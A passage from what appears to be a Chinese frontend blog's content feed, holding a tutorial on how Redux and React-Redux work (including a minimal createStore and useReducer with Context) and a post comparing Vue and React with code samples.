class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; fetchEventSource &#125; <span class="keyword">from</span> <span class="string">'@microsoft/fetch-event-source'</span>;</span><br><span class="line"></span><br><span class="line">fetchEventSource(<span class="string">`/api/v2/chat/<span class="subst">$&#123;key&#125;</span>`</span>, &#123;</span><br><span class="line">  method: <span class="string">'POST'</span>,</span><br><span class="line">  headers: &#123;</span><br><span class="line">    <span class="string">'Content-Type'</span>: <span class="string">'application/json'</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">  body: <span class="built_in">JSON</span>.stringify(&#123;</span><br><span class="line">    messages: [],</span><br><span class="line">    agent_name: botItem.botName,</span><br><span class="line">    stream: <span class="literal">true</span>,</span><br><span class="line">  &#125;),</span><br><span class="line">  openWhenHidden: <span class="literal">true</span>,</span><br><span class="line">  onerror(err) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'出错啦：'</span> + err);</span><br><span class="line">    <span class="keyword">throw</span> err;</span><br><span class="line">  &#125;,</span><br><span class="line">  onmessage(res) &#123;&#125;</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      <categories>
          
          <category> HTTP </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Redux + React-Redux 工作原理</title>
      <link href="/2024/10/25/Redux/"/>
      <url>/2024/10/25/Redux/</url>
      <content type="html"><![CDATA[<blockquote><p>曾几何时，Redux 作为 React 全家桶的固定成员，几乎是面试必考题。Redux 做了什么？解决了什么问题？原理是啥？Hooks出来之后，我们还需要它吗？</p></blockquote><h3 id="1-适用场景"><a href="#1-适用场景" class="headerlink" title="1. 适用场景"></a>1. 适用场景</h3><p>当一份数据需要全局共享时，如果不使用 Redux 状态管理工具，不按照一定规律处理状态的读写，你的代码很快就会变成一团乱麻。<br>这个时候你需要一种机制，可以在全局同一个地方查询状态、改变状态、传播状态的变化。<br><em>Redux</em> 就是这个机制。</p><p><br></p><h3 id="2-Redux是怎么做的？"><a href="#2-Redux是怎么做的？" class="headerlink" title="2. Redux是怎么做的？"></a>2. Redux是怎么做的？</h3><p>首先，所有的状态，都保存在一个对象里。</p><ul><li><em><code>store</code></em>：保存数据的地方</li><li><em><code>state</code></em>: 是store当前时刻的快照，可以通过<code>store.getState()</code>获得</li><li><em><code>action</code></em>: 表示当前要执行的操作，是一个对象 <code>const action = { type: &#39;ADD_TODO&#39;， payload: 1 }</code></li><li><em><code>dispatch</code></em>: 是发出Action的唯一办法</li><li><em><code>reduer</code></em>: store收到action后，必须给出一个全新的state，这样view才发生变化。这种state的计算过程就叫reducer。<br>Reducer 函数最重要的特征是，它是一个纯函数。只要是同样的输入，必定得到同样的输出。<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 必须是全新的对象</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">reducer</span>(<span class="params">state, action</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">Object</span>.assign(&#123;&#125;, state, &#123; thingToChange &#125;);</span><br><span class="line">  <span class="comment">// 或者</span></span><br><span class="line">  <span class="keyword">return</span> &#123; ...state, ...newState &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><!-- - *`subscribe`*: Store 允许使用store.subscribe方法设置监听函数，一旦 State 发生变化，就自动执行这个函数。 --><p><br></p><p><em>整个流程如下：</em><br>让用户发出action，Reducer函数算出新的State, View重新渲染。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> defaultState = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">const</span> reducer = <span class="function">(<span class="params">state = defaultState, action</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">switch</span> (action.type) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">'ADD'</span>:</span><br><span class="line">      <span class="keyword">return</span> state + action.payload;</span><br><span class="line">    <span class="keyword">default</span>: </span><br><span class="line">      <span class="keyword">return</span> state;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// store.dispatch触发reduer的自动执行</span></span><br><span class="line"><span class="keyword">const</span> state = reducer(<span class="number">1</span>, &#123;</span><br><span class="line">  type: <span class="string">'ADD'</span>,</span><br><span class="line">  payload: <span class="number">2</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="3-实现一个Redux"><a href="#3-实现一个Redux" class="headerlink" title="3. 实现一个Redux"></a>3. 实现一个Redux</h3><p>我们来实现一个Redux<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// store</span></span><br><span class="line"><span class="keyword">const</span> createStore = <span class="function">(<span class="params">reducer</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">let</span> state;</span><br><span class="line">  <span class="keyword">let</span> listeners = [];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> getState = <span class="function"><span class="params">()</span> =&gt;</span> state;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> dispatch = <span class="function">(<span class="params">action</span>) =&gt;</span> &#123;</span><br><span class="line">    state = reducer(state, action);</span><br><span class="line">    listeners.forEach(<span class="function"><span class="params">listener</span> =&gt;</span> listener());</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> subscribe = <span class="function">(<span class="params">listener</span>) =&gt;</span> &#123;</span><br><span class="line">    listeners.push(listener);</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">      listeners = listeners.filter(<span class="function"><span class="params">l</span> =&gt;</span> l !== listener);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  dispatch(&#123;&#125;);</span><br><span class="line">  <span class="keyword">return</span> &#123; getState, dispatch, subscribe &#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="4-视图更新"><a href="#4-视图更新" class="headerlink" title="4. 视图更新"></a>4. 视图更新</h3><p>数据和操作数据的逻辑有了，剩下的问题就是，计算出新的state后，怎么触发视图更新？<br>这时需要用到<code>React-Redux</code>。<code>React-Redux</code>需要解决两个问题：</p><ul><li>state对象如何转化为组件的参数？</li><li>用户发出的Action如何从UI组件传出去？</li></ul><p><code>React-Redux</code>提供 <em><code>connect</code></em>方法，用connect包裹你的组件来创建一个<em>高阶组件</em>，它会传递dispatch方法和Redux储存的state，并作为props传递到组件中。</p><ul><li><em><code>connect</code></em><br>让组件变成能响应state变化的组件。<br><code>connect</code>方法接收两个参数，mapStateToProps 和 mapDispatchToProps</li><li><em><code>mapStateToProps</code></em><br>会将state映射到组件的props上。当state更新的时候，会触发 UI 组件的重新渲染。</li><li><em><code>mapDispatchToProps</code></em><br>会redux里的dispatch方法传递到组件的props上</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> React <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"><span class="keyword">import</span> &#123;connect&#125; <span class="keyword">from</span> <span class="string">'react-redux'</span>;</span><br><span class="line"><span class="keyword">import</span> * <span class="keyword">as</span> actions <span class="keyword">from</span> <span class="string">'../actions/actions'</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">App</span> <span class="keyword">extends</span> <span class="title">React</span>.<span class="title">Component</span> </span>&#123;</span><br><span class="line">  <span class="keyword">constructor</span>(props) &#123;</span><br><span class="line">    <span class="keyword">super</span>(props);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123;count, increment, decrement&#125; = <span class="keyword">this</span>.props;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      &lt;div&gt;</span><br><span class="line">        &lt;h1&gt;The count is &#123;count&#125;&lt;<span class="regexp">/h1&gt;</span></span><br><span class="line"><span class="regexp">        &lt;button onClick=&#123;() =&gt; increment(count)&#125;&gt;+&lt;/</span>button&gt;</span><br><span class="line">        &lt;button onClick=&#123;() =&gt; decrement(count)&#125;&gt;-<span class="xml"><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line">      &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">    );</span></span><br><span class="line"><span class="regexp">  &#125;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">const mapStateToProps = store =&gt; (&#123;</span></span><br><span class="line"><span class="regexp">  count: store.count</span></span><br><span class="line"><span class="regexp">&#125;);</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">const mapDispatchToProps = dispatch =&gt; (&#123;</span></span><br><span class="line"><span class="regexp">  increment: count =&gt; dispatch(actions.increment(count)),</span></span><br><span class="line"><span class="regexp">  decrement: count =&gt; dispatch(actions.decrement(count))</span></span><br><span class="line"><span class="regexp">&#125;);</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">export default connect(mapStateToProps, mapDispatchToProps)(App);</span></span><br></pre></td></tr></table></figure><p><br></p><h3 id="5-useReducer-代替-Redux"><a href="#5-useReducer-代替-Redux" class="headerlink" title="5. useReducer 代替 Redux"></a>5. useReducer 代替 Redux</h3><p>但是，自从hooks出来之后，新版 React 结合reducer和Context，就可以直接替代Redux。<br>state 存在于顶层组件中，由 useReducer 管理，Context 进行分发。子组件可以轻松获取 state 和 dispatch。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; createContext, useReducer &#125; <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> TasksContext = createContext(<span class="literal">null</span>);</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> TasksDispatchContext = createContext(<span class="literal">null</span>);</span><br><span class="line"><span class="keyword">export</span> <span class="function"><span class="keyword">function</span> <span class="title">TasksProvider</span>(<span class="params">&#123; children &#125;</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> [tasks, dispatch] = useReducer(tasksReducer, initialTasks);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    &lt;TasksContext.Provider value=&#123;tasks&#125;&gt;</span><br><span class="line">      &lt;TasksDispatchContext.Provider value=&#123;dispatch&#125;&gt;</span><br><span class="line">        &#123;children&#125;</span><br><span class="line">      &lt;<span class="regexp">/TasksDispatchContext.Provider&gt;</span></span><br><span class="line"><span class="regexp">    &lt;/</span>TasksContext.Provider&gt;</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 组件中获取task和dispatch</span></span><br><span class="line"><span class="keyword">const</span> dispatch = useContext(TasksDispatchContext);</span><br><span class="line"><span class="keyword">const</span> tasks = useContext(TasksContext);</span><br></pre></td></tr></table></figure></p><p>也可以再封装一层<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="function"><span class="keyword">function</span> <span class="title">useTasks</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> useContext(TasksContext);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">export</span> <span class="function"><span class="keyword">function</span> <span class="title">useTasksDispatch</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> useContext(TasksDispatchContext);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> tasks = useTasks();</span><br><span class="line"><span class="keyword">const</span> dispatch = useTasksDispatch();</span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="6-现在的Redux"><a href="#6-现在的Redux" class="headerlink" title="6. 现在的Redux"></a>6. 现在的Redux</h3><p>那还用redux吗？最新版Redux在提供什么解决方案？最新包叫<code>Redux Toolkit</code><br>我觉得核心优势只剩下<em><code>createSlice</code></em>， 让你使用 Immer 库 来编写 reducer，不需要使用拓展运算符，消除意外的 mutations<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; createSlice &#125; <span class="keyword">from</span> <span class="string">"@reduxjs/toolkit"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> todosSlice = createSlice(&#123;</span><br><span class="line">  name: <span class="string">"todos"</span>,</span><br><span class="line">  initialState: [],</span><br><span class="line">  reducers: &#123;</span><br><span class="line">    todoAdded(state, action) &#123;</span><br><span class="line">      state.push(&#123;</span><br><span class="line">        id: action.payload.id,</span><br><span class="line">        text: action.payload.text,</span><br><span class="line">        completed: <span class="literal">false</span>,</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;,</span><br><span class="line">    todoToggled(state, action) &#123;</span><br><span class="line">      <span class="keyword">const</span> todo = state.find(<span class="function">(<span class="params">todo</span>) =&gt;</span> todo.id === action.payload);</span><br><span class="line">      todo.completed = !todo.completed;</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul><li><a href="https://tech.meituan.com/2017/04/27/vuex-code-analysis.html" target="_blank" rel="noopener">Vuex框架原理与源码分析</a></li><li><a href="https://www.ruanyifeng.com/blog/2016/09/redux_tutorial_part_one_basic_usages.html" target="_blank" rel="noopener">Redux 入门教程</a></li><li><a href="https://juejin.cn/post/6844903934801215501?searchId=2025022315432084B513C608EBE9B0422F" target="_blank" rel="noopener">【译】不要再问我React Hooks能否取代Redux了</a></li><li><a href="https://react.docschina.org/learn/scaling-up-with-reducer-and-context" target="_blank" rel="noopener">使用 Reducer 和 Context 拓展你的应用</a></li></ul>]]></content>
      
      <categories>
          
          <category> React </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>🤔 Vue和React的区别</title>
      <link href="/2024/08/25/Vue%E5%92%8CReact%E7%9A%84%E5%8C%BA%E5%88%AB/"/>
      <url>/2024/08/25/Vue%E5%92%8CReact%E7%9A%84%E5%8C%BA%E5%88%AB/</url>
      <content type="html"><![CDATA[<blockquote><p>都是MVC数据驱动的框架，Vue和React的区别是什么？<br>本文一箩筐总结Vue2, Vue3, React, React Hooks的特点和区别~</p></blockquote><p><br></p><h3 id="1-Vue-和-React-的区别"><a href="#1-Vue-和-React-的区别" class="headerlink" title="1. Vue 和 React 的区别"></a>1. Vue 和 React 的区别</h3><p>可以总结为这几点：</p><p><strong>1. 代码组织方式不同</strong></p><ul><li>React 全JS写法，自成一体。React 注重简单Simple，机制的简单。React的函数式组件（FC）就很 Simple，FC 本质上就是每次重新渲染的时候把整个函数重新跑一遍，这提供了很多可能性。</li><li>Vue分离了<code>&lt;template&gt;</code>和<code>&lt;script&gt;</code>，逻辑和模板分离，加上大量封装程度更高的API。虽然Vue3加入了更灵活的Composition API，但是它本质还是opiton配置式的写法。</li></ul><p><br></p><p><strong>2. 响应式的写法不同</strong></p><ul><li>Vue 用 <code>state = newState</code> 来通知变更，更符合直觉。</li></ul><p>更符合大家心目中响应式的写法。但是无论是Vue2中 <code>this.foo = a</code>，还是 Vue3 中 <code>foo.value = a</code> 的写法，都不能完全达到 <code>state = newState</code> 的效果。都有要额外处理的地方，Vue2中给 <code>data</code> 新增属性，数组操作需要额外的API。Vue3中的 <code>.value</code> 写法不够直观，拆分了 <code>ref</code> 和 <code>reactive</code> 两种类型，响应式丢失<code>toRef</code>等问题也很让人很困惑。</p><ul><li>React显式调用 <code>setState(newState)</code> 来通知变更。</li></ul><p>当 <code>state</code> 是复杂对象时，复制一个全新的副本，修改它，是一件麻烦的事。不过 React 也不想管这个问题，它推荐你用 ImmerJS 来处理。</p><p><br></p><p><strong>3. 重绘性能消耗不同（实现响应式方式不同）</strong></p><p><em>InnerHTML vs Virtual Dom</em></p><ul><li>innerHTML:  render html string + 重新创建所有 DOM 元素</li><li>Virtual DOM: render Virtual DOM + diff + 点对点的 DOM 更新 </li></ul><p>Virtual DOM render + diff 显然比渲染 html 字符串要慢，但是！它依然是纯 js 层面的计算，比起后面的 DOM 操作来说，依然便宜了太多。</p><p><br></p><p><em>从实现响应式方式来看：</em></p><ul><li>依赖收集是Vue的特点，Vue用 <code>proxy</code> , <code>Object.defineProperty</code> 实现依赖收集，依赖追踪。<br>依赖收集提供了点对点粒度的更新触发，而react只能以组件为粒度触发diff</li><li><p>React没有依赖收集，而是在 <code>setState</code> 后通过UI Tree一层一层往下更新渲染。</p><p>当层级较高的 <code>state</code> 变化时，会引起大量组件的更新。为了解决这个问题，React 提出了 Fiber 来处理计算量大的情况下，没有交互响应间隙的问题。同时提供了 <code>useMemo</code>, <code>useCallback</code> 允许你缓存组件，减少不必要的渲染。</p></li></ul><p><br></p><p><strong>4. render 渲染写法不同</strong></p><p>  template 和 JSX 都是 render 的一种表现形式。</p><ul><li>React 的 JSX 能完全融合到JS中，具有更高的灵活性，在复杂的组件中，更具有优势。</li><li>template 其实是往上封装了一层，相同的逻辑代码量更少，更简单直观、更好维护。template可以提供更好的性能优化，用起来也很贴合需求，不会觉得不够用。</li></ul><p><br></p><p><strong>5. API 提供的功能不同</strong></p><ul><li>React Hooks 寥寥几个API，Hooks + Effect 就能满足所有需求，灵活巧妙，需要你一点点去组装。</li><li>Vue 则是提供了大量的 API。Options API 有不少可取之处，data, lifecycle, computed, methods, watch 必须分门别类的放好。避免了新手将功能和逻辑摆的乱七八糟。Vue2以其极低的入门门槛和极其直观的语法，帮助你完成页面开发。除了这些，还有provide/inject, keep-alive, v-model, 这些API是友好的，面对更复杂的场景，它们像一个个最佳实践，需要你一个个去熟悉。</li></ul><p><br></p><p>回忆一下它们都是怎么用的？<br><br></p><h3 id="2-Vue2"><a href="#2-Vue2" class="headerlink" title="2. Vue2"></a>2. Vue2</h3><p>2016年Vue2发布。</p><p>Vue2使用 <code>Options API</code> 配置化的方式组织代码，搭配各种API、指令，很容易满足了各种页面需求，上手容易，简单好用。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 每个`.vue`文件就是一个组件</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  data() &#123; </span><br><span class="line">    <span class="keyword">return</span> &#123; </span><br><span class="line">      count: <span class="number">0</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  methods: &#123; </span><br><span class="line">    increment() &#123; </span><br><span class="line">      <span class="keyword">this</span>.count++ </span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="3-React-Class-Component"><a href="#3-React-Class-Component" class="headerlink" title="3. React(Class Component)"></a>3. React(Class Component)</h3><p>和 Vue2 同期的是 React 的 Class Component。</p><p>每个 UI 组件既是 <code>&lt;Component /&gt;</code> 这样很HTML的写法，又是一个类的实例。</p><p>类(class)让组件的数据和操作逻辑封装在一起，最后返回了JSX，又表达了这是一个UI组件。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Welcome</span> <span class="keyword">extends</span> <span class="title">React</span>.<span class="title">Component</span> </span>&#123;</span><br><span class="line">  state = &#123; <span class="attr">name</span> : <span class="string">''</span> &#125;</span><br><span class="line">  </span><br><span class="line">  componentDidUpdate() &#123;</span><br><span class="line">    <span class="keyword">this</span>.setState(&#123; <span class="attr">name</span>: <span class="string">'hh'</span>&#125;)</span><br><span class="line">  &#125;</span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello, &#123;this.name&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br></p><h3 id="3-React16-Function-Component-Hooks"><a href="#3-React16-Function-Component-Hooks" class="headerlink" title="3. React16 (Function Component + Hooks)"></a>3. React16 (Function Component + Hooks)</h3><p>2019年 React 推出 Hooks 写法。</p><p><br></p><h4 id="3-1-函数组件"><a href="#3-1-函数组件" class="headerlink" title="3.1 函数组件"></a>3.1 函数组件</h4><p>React 希望，组件不要变成复杂的容器。</p><p>React 的函数组件只应该做一件事情：返回组件的 HTML 代码，而没有其他的功能。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Welcome</span>(<span class="params">props</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello, &#123;props.name&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是，这种写法有很大的限制，纯函数无法包含状态，也不支持生命周期方法。</p><p>为了解决这个问题，React引入Hooks，希望不使用”类”，也能写出一个全功能的组件。</p><p><br></p><h4 id="3-2-Hooks"><a href="#3-2-Hooks" class="headerlink" title="3.2 Hooks"></a>3.2 Hooks</h4><p><em><code>Hooks</code></em> 是钩子的意思，组件还是要写成纯函数，如果要其他功能，就要用钩子把它们”钩”进来。</p><p>常见的钩子有：</p><ul><li><code>useState</code>：为函数组件引入状态state</li><li><code>useEffect</code>：引入具有副作用的操作，如获取数据、事件监听、改变DOM<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; useState &#125; <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Counter</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> [count, setCount] = useState(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">const</span> increment = <span class="function"><span class="params">()</span> =&gt;</span> setCount(<span class="function"><span class="params">c</span> =&gt;</span> c + <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">&#123;increment&#125;</span>&gt;</span>&#123;count&#125;<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p>你还可以创建自己的Hooks。</p><p>Hooks的写法将数据、逻辑从class中分离出来，开启了组件逻辑表达和逻辑复用的新范式。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> usePerson = <span class="function">(<span class="params">personId</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> [loading, setLoading] = useState(<span class="literal">true</span>);</span><br><span class="line">  <span class="keyword">const</span> [person, setPerson] = useState(&#123;&#125;);</span><br><span class="line">  useEffect(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    setLoading(<span class="literal">true</span>);</span><br><span class="line">    fetch(<span class="string">`https://swapi.co/api/people/<span class="subst">$&#123;personId&#125;</span>/`</span>)</span><br><span class="line">      .then(<span class="function"><span class="params">response</span> =&gt;</span> response.json())</span><br><span class="line">      .then(<span class="function"><span class="params">data</span> =&gt;</span> &#123;</span><br><span class="line">        setPerson(data);</span><br><span class="line">        setLoading(<span class="literal">false</span>);</span><br><span class="line">      &#125;);</span><br><span class="line">  &#125;, [personId]);  </span><br><span class="line">  <span class="keyword">return</span> [loading, person];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="4-Vue3-Compsition-API"><a href="#4-Vue3-Compsition-API" class="headerlink" title="4. Vue3 Compsition API"></a>4. Vue3 Compsition API</h3><p>受到 React hooks 的启发，Vue3 提供了类似的 Composition API。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; ref &#125; <span class="keyword">from</span> <span class="string">'vue'</span>;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  setup() &#123;</span><br><span class="line">    <span class="keyword">const</span> count = ref(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">const</span> increment = <span class="function"><span class="params">()</span> =&gt;</span> count.value++;</span><br><span class="line">    <span class="keyword">return</span> &#123; count, increment &#125;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br></p><p>End.</p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul><li><a href="https://vue3js.cn/vue-composition/" target="_blank" rel="noopener">Vue 组合式 API</a></li><li><a href="https://www.ruanyifeng.com/blog/2020/09/react-hooks-useeffect-tutorial.html" target="_blank" rel="noopener">阮一峰：轻松学会 React 钩子：以 useEffect() 为例</a></li><li><a href="https://www.zhihu.com/question/309891718/answer/3073163101" target="_blank" rel="noopener">谁能大致说下vue和react的最大区别之处？</a></li></ul>]]></content>
      
      <categories>
          
          <category> React </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>XHR：实现一个Axios</title>
